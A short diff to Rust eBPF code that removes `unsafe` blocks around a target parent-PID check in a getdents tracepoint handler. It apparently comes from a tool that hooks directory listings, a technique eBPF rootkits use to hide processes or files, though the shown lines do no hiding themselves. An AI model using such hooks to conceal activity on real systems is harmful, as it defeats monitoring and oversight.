@@ -46,7 +46,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
 
     let pid_tgid = bpf_get_current_pid_tgid();
 
-    if unsafe { *the_target_ppid } != 0 {
+    if *the_target_ppid != 0 {
         let ppid = unsafe {
             let task = bpf_get_current_task() as *const task_struct;
 
@@ -60,7 +60,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
                 .unwrap()
         };
 
-        if ppid != unsafe { *the_target_ppid } {
+        if ppid != *the_target_ppid {
             return Ok(0);
         }
     }
